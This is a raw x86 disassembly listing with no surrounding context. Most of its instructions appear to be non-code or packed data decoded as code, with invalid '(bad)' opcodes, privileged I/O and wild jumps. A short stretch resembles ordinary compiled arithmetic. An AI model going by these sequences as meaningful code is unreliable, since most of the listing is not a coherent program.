  409b89:	mov    ecx,0x6abb0799
  409b8e:	or     BYTE PTR [ecx+0x4f],cl
  409b91:	mov    BYTE PTR [eax+0x17],bl
  409b94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b95:	cmp    esp,DWORD PTR [ebx+0xbec9351]
  409b9b:	retf   
  409b9c:	in     eax,dx
  409b9d:	adc    BYTE PTR [ecx+0x19],cl
  409ba0:	pop    esp
  409ba1:	mov    ds:0x1369ee78,al
  409ba6:	and    DWORD PTR [edi+0xe],ebp
  409ba9:	aad    0x2b
  409bab:	jmp    0x409b7b
  409bad:	out    0xd1,eax
  409baf:	jne    0x409c2b
  409bb1:	mov    ah,0x4c
  409bb3:	jnp    0x409b48
  409bb5:	push   ebx
  409bb6:	push   0xffffffe1
  409bb8:	pop    ebx
  409bb9:	icebp  
  409bba:	ss push 0x49c413dd
  409bc0:	fwait
  409bc1:	add    ebx,DWORD PTR ds:0x593107bb
  409bc7:	mov    edi,ss
  409bc9:	xor    ah,BYTE PTR [ebx-0x576c8de4]
  409bcf:	fldenv [ecx]
  409bd1:	repnz adc eax,0xa228036f
  409bd7:	shr    DWORD PTR [edi+0x36],0x78
  409bdb:	jns    0x409c09
  409bdd:	xor    cl,0xa0
  409be0:	shl    DWORD PTR [edx+eiz*4],1
  409be3:	adc    al,0xb3
  409be5:	out    0xda,eax
  409be7:	add    DWORD PTR [ecx],0xb148d4b0
  409bed:	out    0x6,al
  409bef:	test   BYTE PTR [ecx],0x6b
  409bf2:	gs push es
  409bf4:	xor    edx,esi
  409bf6:	int    0x94
  409bf8:	jbe    0x409c52
  409bfa:	fcmovbe st,st(4)
  409bfc:	push   esi
  409bfd:	mov    edi,0xcf939d3f
  409c02:	add    cl,ch
  409c04:	(bad)  
  409c05:	popf   
  409c06:	jmp    0x409ba3
  409c08:	pop    ss
  409c09:	jmp    0xeafb:0xafdcf192
  409c10:	je     0x409c10
  409c12:	push   ebx
  409c13:	adc    al,0xc5
  409c15:	mov    WORD PTR [ebp+eax*2-0x75],ss
  409c19:	mov    ah,0xa5
  409c1b:	pusha  
  409c1c:	and    ah,dh
  409c1e:	add    DWORD PTR [esi+0x421c4276],esi
  409c24:	stos   BYTE PTR es:[edi],al
  409c25:	dec    ebx
  409c26:	push   ebx
  409c27:	pop    edx
  409c28:	jecxz  0x409bfb
  409c2a:	ret    
  409c2b:	pop    edi
  409c2c:	add    edx,DWORD PTR [eax-0x4e605735]
  409c32:	imul   ebx,DWORD PTR [ecx-0x4c],0xffffff85
  409c36:	jmp    0xb1a79afc
  409c3b:	cdq    
  409c3c:	xor    BYTE PTR [ebx],0xc7
  409c3f:	xor    edx,edx
  409c41:	jmp    0x40a1cb
  409c46:	into   
  409c47:	icebp  
  409c48:	test   DWORD PTR [ecx+ebp*1+0x6ce82e28],ebp
  409c4f:	dec    eax
  409c50:	push   edx
  409c51:	mov    dl,0x51
  409c53:	cmp    edi,0x16290268
  409c59:	push   ss
  409c5a:	cmp    eax,0xea161604
  409c5f:	mov    al,0x68
  409c61:	adc    al,0xc0
  409c63:	jp     0x409c8b
  409c65:	cmp    edx,ebp
  409c67:	dec    eax
  409c68:	call   0x6af3f553
  409c6d:	push   cs
  409c6e:	ficom  WORD PTR [eax]
  409c70:	pause  
  409c72:	add    ebp,DWORD PTR [ebp+0x428eb38e]
  409c78:	pop    edi
  409c79:	pop    eax
  409c7a:	sub    bh,BYTE PTR [esi+esi*8-0x22]
  409c7e:	mov    edx,0x5493ca96
  409c83:	add    ebp,DWORD PTR [edi+0x1d]
  409c86:	ucomiss xmm0,xmm7
  409c89:	mov    ch,0x53
  409c8b:	cmp    ch,BYTE PTR [edx+0x5]
  409c8e:	adc    eax,0xd8c1b514
  409c93:	std    
  409c94:	push   eax
  409c95:	outs   dx,BYTE PTR ds:[esi]
  409c96:	mov    ds:0x8ce7cb3a,al
  409c9b:	jae    0x409c9b
  409c9d:	mov    dh,ah
  409c9f:	imul   BYTE PTR [esp+ebx*1+0x7c]
  409ca3:	or     eax,edx
  409ca5:	ds jge 0x409c97
  409ca8:	loop   0x409c70
  409caa:	mov    WORD PTR [ecx],ss
  409cac:	push   ss
  409cad:	push   0xcc1c6ba2
  409cb2:	into   
  409cb3:	int    0xa0
  409cb5:	ficom  DWORD PTR [ecx+esi*2+0xfa5ce7f]
  409cbc:	sti    
  409cbd:	es or  eax,0xea348dff
  409cc3:	mov    bl,0xee
  409cc5:	and    BYTE PTR [edi],0x5b
  409cc8:	or     al,0x10
  409cca:	cmp    BYTE PTR [edx],dh
  409ccc:	mov    dl,0x3e
  409cce:	mov    es,WORD PTR [eax+0x42]
  409cd1:	test   eax,0x54e48ffe
  409cd6:	cmc    
  409cd7:	mov    cl,0xc5
  409cd9:	lahf   
  409cda:	and    cl,BYTE PTR [ebx+0x66799333]
  409ce0:	ins    DWORD PTR es:[edi],dx
  409ce1:	sar    cl,1
  409ce3:	xchg   esp,eax
  409ce4:	cdq    
  409ce5:	loop   0x409c85
  409ce7:	inc    edi
  409ce8:	repz jb 0x409d0e
  409ceb:	test   BYTE PTR [ecx+0x4bda331e],al
  409cf1:	adc    DWORD PTR [edi-0xeef85b],ebp
  409cf7:	mov    ebx,0x85ee8325
  409cfc:	push   ebp
  409cfd:	ins    BYTE PTR es:[edi],dx
  409cfe:	(bad)  
  409cff:	jge    0x409cc4
  409d01:	repz (bad) 
  409d04:	stc    
  409d05:	lods   eax,DWORD PTR ds:[esi]
  409d06:	out    0x80,al
  409d08:	ds retf 0x5fff
  409d0c:	inc    ebx
  409d0d:	clc    
  409d0e:	xor    DWORD PTR [edx],esi
  409d10:	ss jmp 0xe1606966
  409d16:	fcomp  QWORD PTR [eax]
  409d18:	ins    BYTE PTR es:[edi],dx
  409d19:	push   0xffffffba
  409d1b:	mov    al,0xf2
  409d1d:	jo     0x409d0f
  409d1f:	fisttp QWORD PTR [eax+0x70]
  409d22:	shl    DWORD PTR [ebp+0x670bea30],0x29
  409d29:	mov    ah,0xa2
  409d2b:	push   esi
  409d2c:	and    DWORD PTR [ebx+0x760e9172],ebp
  409d32:	jno    0x409d2d
  409d34:	test   al,0xa5
  409d36:	or     dh,BYTE PTR [edi]
  409d38:	ss int 0x4e
  409d3b:	in     al,0xa3
  409d3d:	xor    al,0x2b
  409d3f:	test   BYTE PTR [edx+0x60be7be3],dl
  409d45:	ins    DWORD PTR es:[edi],dx
  409d46:	inc    ebx
  409d47:	mov    cl,0x10
  409d49:	fdivr  st,st(6)
  409d4b:	cmp    eax,0x16b091d7
  409d50:	jae    0x409d53
  409d52:	call   0x303c0f09
  409d57:	add    BYTE PTR [ebx-0x6e],dl
  409d5a:	shl    BYTE PTR [ebx-0x607f0f52],0x83
  409d61:	sub    bl,ah
  409d63:	or     cl,BYTE PTR ds:0x368c5435
  409d69:	ins    BYTE PTR es:[edi],dx
  409d6a:	popa   
  409d6b:	inc    esi
  409d6c:	mov    ch,0x25
  409d6e:	sbb    BYTE PTR [esp+ecx*2],ch
  409d71:	mov    al,0x32
  409d73:	fidiv  WORD PTR [ebx+edx*4]
  409d76:	jp     0x409d8e
  409d78:	mov    bl,0xca
  409d7a:	cmp    DWORD PTR [esi],esp
  409d7c:	and    al,0xa1
  409d7e:	jge    0x409d7a
  409d80:	pop    ds
  409d81:	adc    eax,0x40bb8b6
  409d86:	add    DWORD PTR [eax+0x2d],ebp
  409d89:	jnp    0x409db5
  409d8b:	jecxz  0x409d61
  409d8d:	ins    BYTE PTR es:[edi],dx
  409d8e:	clc    
  409d8f:	mov    ebp,0x2b53cd3f
  409d94:	pusha  
  409d95:	or     dl,dl
  409d97:	(bad)  
  409d98:	cmp    DWORD PTR [ecx],ebx
  409d9a:	add    eax,0x45659882
  409d9f:	or     eax,DWORD PTR [esi+esi*2-0x1a]
  409da3:	rep outs dx,BYTE PTR ds:[esi]
  409da5:	je     0x409e1f
  409da7:	mov    BYTE PTR [esp+0x6d],ch
  409dab:	push   edx
  409dac:	ins    BYTE PTR es:[edi],dx
  409dad:	mov    DWORD PTR [ebx+0x5ee18d7b],ecx
  409db3:	jle    0x409de1
  409db5:	ret    0x8b56
  409db8:	mov    ah,BYTE PTR [ecx]
  409dba:	dec    edx
  409dbb:	xor    al,0x37
  409dbd:	rcl    DWORD PTR [ebx+0x60],cl
  409dc0:	inc    ebp
  409dc1:	ins    BYTE PTR es:[edi],dx
  409dc2:	or     BYTE PTR [ebp+0x20],cl
  409dc5:	pop    eax
  409dc6:	xchg   esi,eax
  409dc7:	cli    
  409dc8:	sbb    BYTE PTR [edx-0x4f7864f6],bh
  409dce:	fcmovnu st,st(2)
  409dd0:	inc    edx
  409dd1:	jmp    0x58b4b954
  409dd6:	rol    DWORD PTR [edi+0x59],1
  409dd9:	je     0x409e25
  409ddb:	adc    eax,0x1dc80a3c
  409de0:	addr16 adc ebp,esi
  409de3:	fadd   QWORD PTR [eax]
  409de5:	or     bh,BYTE PTR [ecx-0x452395ca]
  409deb:	int    0xda
  409ded:	or     dl,BYTE PTR [ecx-0x5704f9dc]
  409df3:	dec    ecx
  409df4:	ja     0x409dec
  409df6:	jmp    0x409d90
  409df8:	xor    al,BYTE PTR [ebx-0x78fe595]
  409dfe:	pop    ss
  409dff:	mov    al,0xa6
  409e01:	push   ss
  409e02:	scas   al,BYTE PTR es:[edi]
  409e03:	or     esp,DWORD PTR ds:[edx+0x22]
  409e07:	mov    eax,ds:0xe15b94be
  409e0c:	jle    0x409db7
  409e0e:	or     dh,BYTE PTR [esi+0x29]
  409e11:	mov    ebp,0xa022e3d
  409e16:	xchg   edi,eax
  409e17:	or     DWORD PTR [esp+ecx*2-0x7c85049d],edx
  409e1e:	cs pop eax
  409e20:	mov    WORD PTR [ebx],fs
  409e22:	cmc    
  409e23:	imul   ebp,DWORD PTR [ebx],0x64ea4497
  409e29:	call   0x9d0b:0xee82ad0
  409e30:	xor    eax,0x9ab588b2
  409e35:	xchg   edi,eax
  409e36:	or     al,0x2c
  409e38:	xchg   DWORD PTR ds:0xd1d53b44,ebx
  409e3e:	xchg   BYTE PTR [ebp+0x14432c2d],bl
  409e44:	or     ah,BYTE PTR [ebx+edi*4+0x53]
  409e48:	shl    DWORD PTR [ebx-0x5f5ca6bc],0x30
  409e4f:	dec    esp
  409e50:	mov    edi,0x7a319ce7
  409e55:	rcl    DWORD PTR [edx+0x20],cl
  409e58:	(bad)  
  409e59:	xor    eax,0xc33cf62e
  409e5e:	mov    cl,0xe7
  409e60:	pop    ds
  409e61:	sbb    DWORD PTR [ebp-0x664ba06a],edx
  409e67:	retf   0xaa1d
  409e6a:	xlat   BYTE PTR ds:[ebx]
  409e6b:	ds jb  0x409e37
  409e6e:	stos   DWORD PTR es:[edi],eax
  409e6f:	jmp    0x7637a179
  409e74:	xor    eax,0x119db211
  409e79:	repz cmp eax,0x3d6da012
  409e7f:	jmp    0x68cb:0xa3972f46
  409e86:	int    0x92
  409e88:	mov    edx,0x45ce039d
  409e8d:	xor    DWORD PTR [edx-0x13],0xffffffc3
  409e91:	ins    DWORD PTR es:[edi],dx
  409e92:	sub    al,0x12
  409e94:	pusha  
  409e95:	jecxz  0x409ed4
  409e97:	hlt    
  409e98:	inc    ecx
  409e99:	rcr    ecx,0xee
  409e9c:	lahf   
  409e9d:	cmp    DWORD PTR [edi-0x3509f7c8],edi
  409ea3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409ea4:	push   edi
  409ea5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409ea6:	xlat   BYTE PTR ds:[ebx]
  409ea7:	add    bl,BYTE PTR [eax]
  409ea9:	or     esi,DWORD PTR [esi-0x5abdd04a]
  409eaf:	in     eax,dx
  409eb0:	mov    al,ds:0xc025c571
  409eb5:	jns    0x409ecb
  409eb7:	mov    ebp,0x65e2f322
  409ebc:	les    ebx,FWORD PTR [esi]
  409ebe:	ret    
  409ebf:	mov    bh,0x9c
  409ec1:	fmul   QWORD PTR es:0x15193033
  409ec8:	pop    edi
  409ec9:	cmp    esi,edi
  409ecb:	loope  0x409efc
  409ecd:	push   es
  409ece:	out    dx,al
  409ecf:	add    BYTE PTR [esi],dh
  409ed1:	lea    eax,[ebx+0x45]
  409ed4:	mov    esi,DWORD PTR [eax-0x4f3c69a8]
  409eda:	push   ebx
  409edb:	mov    bh,0xd0
  409edd:	icebp  
  409ede:	and    dl,BYTE PTR [ebp-0x5a38c26a]
  409ee4:	enter  0x88f3,0xd4
  409ee8:	xchg   esi,eax
  409ee9:	test   eax,0xaf0d9570
  409eee:	outs   dx,DWORD PTR ds:[esi]
  409eef:	jp     0x409f55
  409ef1:	mov    ds:0x65ce02dd,eax
  409ef6:	test   al,0xf0
  409ef8:	aam    0x42
  409efa:	mov    eax,ds:0x4a18725e
  409eff:	hlt    
  409f00:	icebp  
  409f01:	sbb    ah,BYTE PTR [edx]
  409f03:	cli    
  409f04:	mov    esi,0x1705d129
  409f09:	xor    DWORD PTR [eax+0x50],edx
  409f0c:	(bad)  
  409f0d:	out    dx,eax
  409f0e:	jmp    0x9fd1a55c
  409f13:	inc    ebx
  409f14:	adc    ebp,DWORD PTR [edi+0x65]
  409f17:	push   edx
  409f18:	cmp    esp,DWORD PTR [ecx-0x5421b36]
  409f1e:	test   eax,0xd311658b
  409f23:	and    edi,0x17
  409f26:	lods   eax,DWORD PTR ds:[esi]
  409f27:	xor    eax,0x630d2fee
  409f2c:	test   eax,0x24cc4c54
  409f31:	and    bl,BYTE PTR [esi]
  409f33:	lock jne 0x409ebe
  409f36:	push   ecx
  409f37:	mov    DWORD PTR [edx],eax
  409f39:	in     al,dx
  409f3a:	inc    edx
  409f3b:	add    eax,0xd32427a3
  409f40:	xor    DWORD PTR [esi-0x6b1113f2],edx
  409f46:	adc    DWORD PTR [ecx+edi*2-0x40],eax
  409f4a:	pop    esi
  409f4b:	adc    al,0x87
  409f4d:	sbb    DWORD PTR [esi],edi
  409f4f:	mov    BYTE PTR [edx+0x2e],ah
  409f52:	cmc    
  409f53:	retf   0xe327
  409f56:	repnz dec ebx
  409f58:	cli    
  409f59:	imul   esi,DWORD PTR [ecx-0x33],0xffffff9a
  409f5d:	sar    edx,1
  409f5f:	lea    ebx,[ebp-0x5f]
  409f62:	mov    dl,0x93
  409f64:	fwait
  409f65:	call   0xbb069fc9
  409f6a:	bound  edx,QWORD PTR [esi-0x38dc2df8]
  409f70:	fwait
  409f71:	cwde   
  409f72:	(bad)
  409f75:	mov    al,0x78
  409f77:	bound  esi,QWORD PTR ds:0x48eed296
  409f7d:	sahf   
  409f7e:	xchg   BYTE PTR [ebp+0x58],bh
  409f81:	popa   
  409f82:	sbb    BYTE PTR [eax-0x4f],ah
  409f85:	cmp    al,BYTE PTR ds:0x6d7e
  409f8a:	dec    ebp
  409f8b:	int    0x89
  409f8d:	inc    eax
  409f8e:	inc    ecx
  409f8f:	stc    
  409f90:	lods   al,BYTE PTR ds:[esi]
  409f91:	lahf   
  409f92:	push   edi
  409f94:	push   ebp
  409f95:	sub    eax,0xd98307fa
  409f9a:	sub    edx,edx
  409f9c:	sar    DWORD PTR [eax-0x561448cd],1
  409fa2:	outs   dx,DWORD PTR ds:[esi]
  409fa3:	je     0x409fe6
  409fa5:	jnp    0x40a003
  409fa7:	xor    al,0x5c
  409fa9:	adc    DWORD PTR [eax-0x43],ecx
  409fac:	(bad)  
  409fad:	stos   DWORD PTR es:[edi],eax
  409fae:	imul   edi,ebp,0x6a
  409fb1:	clc    
  409fb2:	aaa    
  409fb3:	cdq    
  409fb4:	push   edx
  409fb5:	jbe    0x409f58
  409fb7:	dec    esi
  409fb8:	jne    0x409fdd
  409fba:	sti    
  409fbb:	and    ecx,eax
  409fbd:	into   
  409fbe:	inc    esi
  409fbf:	jo     0x409fd0
  409fc1:	stc    
  409fc2:	xor    edi,DWORD PTR [edi-0x5a67188b]
  409fc8:	sbb    bl,bh
  409fca:	mov    ebx,DWORD PTR [eax+0x5a2ffcf9]
  409fd0:	mul    BYTE PTR [esi-0x8e8adbf]
  409fd6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409fd7:	popa   
  409fd8:	or     bh,ah
  409fda:	jbe    0x40a04c
  409fdc:	adc    ch,BYTE PTR ds:[ecx]
  409fdf:	xchg   esp,eax
  409fe0:	iret   
  409fe1:	ss mov ecx,0xc0539c0e
  409fe7:	pusha  
  409fe8:	inc    ebx
  409fe9:	ret    0x5d91
  409fec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409fed:	jo     0x40a00f
  409fef:	sub    eax,0x5bcb727d
  409ff4:	rcl    BYTE PTR [ebx],cl
  409ff6:	pushf  
  409ff7:	mov    eax,ds:0xb75f8196
  409ffc:	and    eax,0xd262fcec
  40a001:	push   ebp
  40a002:	add    BYTE PTR [eax+0x48],al
  40a005:	repz xor ecx,DWORD PTR [ecx+0x2977c678]
  40a00c:	ds data16 (bad) 
  40a00f:	cmp    eax,0xcb5d8eaa
  40a014:	or     al,0xc9
  40a016:	imul   edx,DWORD PTR [ecx-0x7],0xffffffeb
  40a01a:	xchg   edi,eax
  40a01b:	mov    ebp,0x9269c1ac
  40a020:	mov    al,ds:0xc660a556
  40a025:	lods   eax,DWORD PTR ds:[esi]
  40a026:	and    eax,0x216ea3d3
  40a02b:	bound  ebx,QWORD PTR [eax]
  40a02d:	xchg   DWORD PTR [ebp+0x29],ebx
  40a030:	adc    eax,0x31ebf44d
  40a035:	es test eax,0x9f6f38a0
  40a03b:	push   edx
  40a03c:	and    eax,0x79c5eae3
  40a041:	adc    eax,0x815bc77d
  40a046:	ret    
  40a047:	scas   al,BYTE PTR es:[edi]
  40a048:	push   ds
  40a049:	loopne 0x40a0bc
  40a04b:	push   edx
  40a04c:	add    dl,BYTE PTR [esi-0x12]
  40a04f:	cmp    ebx,DWORD PTR [ecx-0x470cb588]
  40a055:	int3   
  40a056:	pop    es
  40a057:	jo     0x409ffa
  40a059:	loop   0x40a04c
  40a05b:	je     0x40a002
  40a05d:	sub    bl,bh
  40a05f:	or     dl,BYTE PTR [esi-0x37]
  40a062:	push   ecx
  40a063:	cld    
  40a064:	xor    eax,0x2d08c551
  40a069:	mov    dl,0x2d
  40a06b:	mov    DWORD PTR [eax-0x3c9993b4],edi
  40a071:	popa   
  40a072:	ins    BYTE PTR es:[edi],dx
  40a073:	mov    ?,WORD PTR [ebx+0x16]
  40a076:	mov    DWORD PTR [ecx],esi
  40a078:	stos   BYTE PTR es:[edi],al
  40a079:	dec    eax
  40a07a:	popf   
  40a07b:	in     al,0x68
  40a07d:	aaa    
  40a07e:	sbb    al,BYTE PTR [ebx-0xa]
  40a081:	daa    
  40a082:	outs   dx,DWORD PTR ds:[esi]
  40a083:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a084:	pusha  
  40a085:	cmp    bl,BYTE PTR [ecx+0xa]
  40a088:	mov    eax,0x8e031e87
  40a08d:	lods   al,BYTE PTR ds:[esi]
  40a08e:	setb   BYTE PTR [ecx-0xb]
  40a092:	sub    DWORD PTR [ebx+0x1b],0xdf9b0aca
  40a099:	push   esi
  40a09a:	imul   ecx,esp,0xffffffa9
  40a09d:	aad    0xa9
  40a09f:	and    DWORD PTR [ebp+0x72bab1b8],edx
  40a0a5:	int    0x6b
  40a0a7:	ret    0x2d81
  40a0aa:	arpl   bp,cx
  40a0ac:	sub    DWORD PTR [ebx+0x34da5832],edi
  40a0b2:	mov    dh,0x94
  40a0b4:	xchg   ecx,eax
  40a0b5:	std    
  40a0b6:	dec    ecx
  40a0b7:	xor    edi,DWORD PTR [ecx-0x109c5dc4]
  40a0bd:	int    0x3c
  40a0bf:	(bad)  
  40a0c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a0c1:	dec    ecx
  40a0c2:	xchg   esp,eax
  40a0c3:	xchg   esp,eax
  40a0c4:	fdivrp st(5),st
  40a0c6:	popf   
  40a0c7:	aaa    
  40a0c8:	cs push eax
  40a0ca:	cld    
  40a0cb:	les    ebx,FWORD PTR [ecx]
  40a0cd:	imul   ebx,DWORD PTR [edx-0x29],0x92b64944
  40a0d4:	test   al,0xb9
  40a0d6:	sbb    al,0x5e
  40a0d8:	int    0xaa
  40a0da:	ins    BYTE PTR es:[edi],dx
  40a0db:	test   al,0xe3
  40a0dd:	das    
  40a0de:	sub    eax,0xc9e30731
  40a0e3:	out    0x92,eax
  40a0e5:	(bad)  
  40a0e7:	adc    ch,ah
  40a0e9:	data16 in ax,dx
  40a0ec:	push   ss
  40a0ed:	mov    ebp,0xbed4d70c
  40a0f2:	mov    dl,ch
  40a0f4:	jmp    0x40a0b9
  40a0f6:	xchg   esp,eax
  40a0f7:	mov    ah,0xce
  40a0f9:	(bad)  
  40a0fa:	cmp    BYTE PTR [edx+0x5b],cl
  40a0fd:	cld    
  40a0fe:	iret   
  40a0ff:	mov    eax,ds:0xbc5fb561
  40a104:	test   eax,0xf2e2efe3
  40a109:	jl     0x40a0df
  40a10b:	jle    0x40a0d2
  40a10d:	mov    ds:0x3c109c52,al
  40a112:	jmp    0x40a15b
  40a114:	jmp    0xfb7c6352
  40a119:	repz mov esp,0x7d648575
  40a11f:	inc    eax
  40a120:	inc    ebx
  40a121:	or     DWORD PTR [ecx+esi*8-0x4e2553b],esi
  40a128:	cmp    ebx,esi
  40a12a:	xor    edi,DWORD PTR [esi]
  40a12c:	jae    0x40a0fc
  40a12e:	not    edx
  40a130:	jmp    0xbb867bf1
  40a135:	pop    ss
  40a136:	and    esi,DWORD PTR [edi+0x7f2d276e]
  40a13c:	in     al,dx
  40a13d:	dec    eax
  40a13e:	ret    0x8735
  40a141:	jno    0x40a1a6
  40a143:	pushf  
  40a144:	(bad)  
  40a145:	fsubr  DWORD PTR [esi+0x65c1d1f4]
  40a14b:	add    eax,DWORD PTR [ebx-0x5a]
  40a14e:	jmp    0x97e8:0xd9a4d6fa
  40a155:	dec    eax
  40a156:	sbb    eax,0x1230071
  40a15b:	adc    eax,0x4da64bdd
  40a160:	nop
  40a161:	or     al,0xbf
  40a163:	push   ebx
  40a164:	aam    0x32
  40a166:	jb     0x40a1a8
  40a168:	mov    ds:0xa6062b44,eax
  40a16d:	cmp    esi,DWORD PTR [ebx]
  40a16f:	js     0x40a17f
  40a171:	outs   dx,DWORD PTR ds:[esi]
  40a172:	das    
  40a173:	add    edi,ebp
  40a175:	pop    ss
  40a176:	and    DWORD PTR [ebp+0x56b38140],edi
  40a17c:	lods   eax,DWORD PTR ds:[esi]
  40a17d:	and    BYTE PTR [esi],0xf
  40a180:	ins    BYTE PTR es:[edi],dx
  40a181:	dec    esp
  40a182:	je     0x40a13d
  40a184:	dec    ecx
  40a185:	push   eax
  40a186:	retf   
  40a187:	dec    edx
  40a188:	jne    0x40a14f
  40a18a:	mov    eax,0x3c825e4
  40a18f:	jo     0x40a1d4
  40a191:	adc    BYTE PTR [ebp+0x44165524],dh
  40a197:	sub    edx,DWORD PTR [edi-0x3e]
  40a19a:	retf   0xb602
  40a19d:	pushf  
  40a19e:	in     al,dx
  40a19f:	loop   0x40a19f
  40a1a1:	fld    st(7)
  40a1a3:	jmp    0x2d870c9f
  40a1a8:	push   es
  40a1a9:	mov    ebx,0xfde2f9cb
  40a1ae:	out    dx,eax
  40a1af:	cli    
  40a1b0:	pop    ss
  40a1b1:	push   ecx
  40a1b2:	and    eax,0xf4e7ea3a
  40a1b7:	bound  ecx,QWORD PTR [ebp-0x1d5a5334]
  40a1bd:	pop    edi
  40a1be:	push   eax
  40a1bf:	(bad)  
  40a1c0:	xor    eax,0x85a8c28d
  40a1c5:	pop    ebp
  40a1c6:	xchg   ebx,eax
  40a1c7:	mov    ds:0xb4d724f,al
  40a1cc:	ret    0xc8a
  40a1cf:	or     BYTE PTR [ebx+0x808cc45],cl
  40a1d5:	mov    eax,DWORD PTR [ebp-0x10]
  40a1d8:	mov    ecx,DWORD PTR [ebp-0xc]
  40a1db:	shrd   eax,ecx,0x2
  40a1df:	shr    ecx,0x2
  40a1e2:	mov    ecx,DWORD PTR [ebp-0x10]
  40a1e5:	mov    edx,DWORD PTR [ebp-0xc]
  40a1e8:	xor    eax,edi
  40a1ea:	shl    ecx,0x1e
  40a1ed:	xor    edx,edx
  40a1ef:	or     eax,edx
  40a1f1:	lea    eax,[ebp+eax*1-0x4]
  40a1f5:	mov    DWORD PTR [ebp-0x34],eax
  40a1f8:	mov    eax,DWORD PTR [ebp-0x10]
  40a1fb:	mov    ecx,DWORD PTR [ebp-0xc]
  40a1fe:	shrd   eax,ecx,0x2
  40a202:	shr    ecx,0x2
  40a205:	jmp    0x40a78f
  40a20a:	sbb    eax,0xb41fb564
  40a20f:	push   ds
  40a210:	sbb    eax,0xfb6fa164
  40a215:	mov    ah,0xf0
  40a217:	adc    al,0x68
  40a219:	jb     0x40a254
  40a21b:	pop    ds
  40a21c:	push   ss
  40a21d:	push   ss
  40a21e:	cmp    eax,0x6a161604
  40a223:	cmp    ebx,DWORD PTR [esi+eiz*8-0x4b78f1b9]
  40a22a:	ret    
  40a22b:	dec    edx
  40a22c:	pop    ecx
  40a22d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a22e:	or     BYTE PTR [eax-0x75],ah
  40a231:	inc    edx
  40a232:	(bad)  
  40a233:	outs   dx,BYTE PTR ds:[esi]
  40a234:	icebp  
  40a235:	sub    BYTE PTR [ebp+0x7c5c1600],cl
  40a23b:	test   eax,0x3b5fbe76
  40a240:	adc    esi,edx
  40a242:	scas   eax,DWORD PTR es:[edi]
  40a243:	push   eax
  40a244:	mov    esp,0x255021e7
  40a249:	(bad)  
  40a24a:	sub    esi,DWORD PTR [edi+0xf]
  40a24d:	imul   eax,DWORD PTR [edx-0x3e],0x2f
  40a251:	inc    edx
  40a252:	mov    ds:0x9ce3d1e1,al
  40a257:	(bad)  
  40a258:	jecxz  0x40a1e8
  40a25a:	jle    0x40a222
  40a25c:	jmp    0xd2d0:0xe9e7ad4e
  40a263:	xor    al,0x6b
  40a265:	xlat   BYTE PTR ds:[ebx]
  40a266:	iret   
  40a267:	out    dx,al
  40a268:	sbb    DWORD PTR [edi-0x26],esp
  40a26b:	ins    BYTE PTR es:[edi],dx
  40a26c:	cwde   
  40a26d:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a26f:	mov    ah,0xe0
  40a271:	and    ch,BYTE PTR cs:[edi-0x2d]
  40a275:	cmp    esi,DWORD PTR [eax+0x56]
  40a278:	cmp    eax,0x5413639d
  40a27d:	dec    ecx
  40a27e:	adc    DWORD PTR [eax+ebx*4],eax
  40a281:	adc    BYTE PTR [edx+0x72161607],cl
  40a287:	jl     0x40a27b
  40a289:	sbb    BYTE PTR [esi],bl
  40a28b:	mov    ebx,0x6e6bec09
  40a290:	and    BYTE PTR [edx-0x6aff7cc9],dl
  40a296:	test   DWORD PTR [eax],edi
  40a298:	xlat   BYTE PTR ds:[ebx]
  40a299:	jl     0x40a25a
  40a29b:	(bad)  
  40a29c:	hlt    
  40a29d:	push   esp
  40a29e:	mov    dh,0xf8
  40a2a0:	in     eax,0xd3
  40a2a2:	shl    eax,1
  40a2a4:	sub    esi,edi
  40a2a6:	add    DWORD PTR [ebp+ecx*1-0x52d8e89f],ebp
  40a2ad:	ret    0x539e
  40a2b0:	fisub  DWORD PTR [edi-0x5aaf7fcb]
  40a2b6:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  40a2b8:	icebp  
  40a2b9:	imul   ebx,DWORD PTR [edx+0x7ff34432],0x4131952f
  40a2c3:	jnp    0x40a275
  40a2c5:	enter  0x26ab,0xdf
  40a2c9:	(bad)  
  40a2cb:	ins    BYTE PTR es:[edi],dx
  40a2cc:	jbe    0x40a292
  40a2ce:	ret    
  40a2cf:	mov    esp,0x7f1f71f9
  40a2d4:	mov    cl,0x99
  40a2d6:	jno    0x40a34e
  40a2d8:	push   ss
  40a2d9:	(bad)  
  40a2da:	mov    ds:0x588b8ca1,al
  40a2df:	mov    dh,0x58
  40a2e1:	pop    eax
  40a2e2:	data16 adc bh,BYTE PTR [esi-0x72]
  40a2e6:	pusha  
  40a2e7:	in     eax,0xfe
  40a2e9:	je     0x40a353
  40a2eb:	sbb    al,0x3a
  40a2ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a2ee:	or     al,0x47
  40a2f0:	das    
  40a2f1:	loope  0x40a27a
  40a2f3:	inc    esi
  40a2f4:	push   ebx
  40a2f5:	sbb    dl,al
  40a2f7:	dec    ebp
  40a2f8:	jb     0x40a306
  40a2fa:	retf   0x3da
  40a2fd:	cdq    
  40a2fe:	loop   0x40a2bb
  40a300:	mov    cl,0x3a
  40a302:	pop    ds
  40a303:	sbb    bh,BYTE PTR [ebx+ebx*4+0x29]
  40a307:	sar    DWORD PTR [eax],1
  40a309:	or     al,BYTE PTR [edx+ecx*8]
  40a30c:	mov    edi,0xd4acd4a6
  40a311:	adc    BYTE PTR [edi],bl
  40a313:	dec    esi
  40a314:	xor    edi,esp
  40a316:	cmp    edi,DWORD PTR [ecx]
  40a318:	ror    DWORD PTR [esi-0x229eeda3],cl
  40a31e:	sbb    al,0xd
  40a320:	retf   
  40a321:	rcr    DWORD PTR [ebx],0xea
  40a324:	pop    ss
  40a325:	dec    ecx
  40a326:	cmp    BYTE PTR [eax],ah
  40a328:	xchg   bl,dh
  40a32a:	(bad)  
  40a32c:	push   DWORD PTR [edx-0x7b7aaec7]
  40a332:	aam    0x6c
  40a334:	fcomip st,st(4)
  40a336:	pop    es
  40a337:	xor    ebx,ecx
  40a339:	dec    ebx
  40a33a:	fsub   st(6),st
  40a33c:	inc    eax
  40a33d:	ret    
